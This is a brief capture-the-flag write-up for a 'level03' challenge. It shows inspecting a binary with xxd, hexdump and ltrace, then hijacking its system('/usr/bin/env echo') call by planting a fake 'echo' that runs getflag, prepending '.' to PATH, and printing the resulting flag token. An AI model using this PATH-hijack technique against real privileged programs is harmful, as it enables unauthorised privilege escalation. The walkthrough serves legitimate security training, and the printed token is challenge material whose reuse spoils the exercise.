## level03

home directory has an exec level03.
when I run it I get: 'Exploit me!'
My first thought was to hexdump the file. 
It's possible to get binary:

	xxd -b file

hex:

	xxd file

or hexdump:

	hexdump -C yourfile (hd is alias for hexdump -C) 

I also found I could use ltrace/strace to show captured library calls and signals.

Inside I found:
> system("/usr/bin/env echo Exploit me"Exploit me

Making my own echo file

	chmod 777 .
	echo 'getflag' > echo
	chmod +x echo

and adding to PATH before the original echo

	export PATH=.:$PATH
	./level03

> Check flag.Here is your token : `qi0maab88jeaj46qoumi7maus`
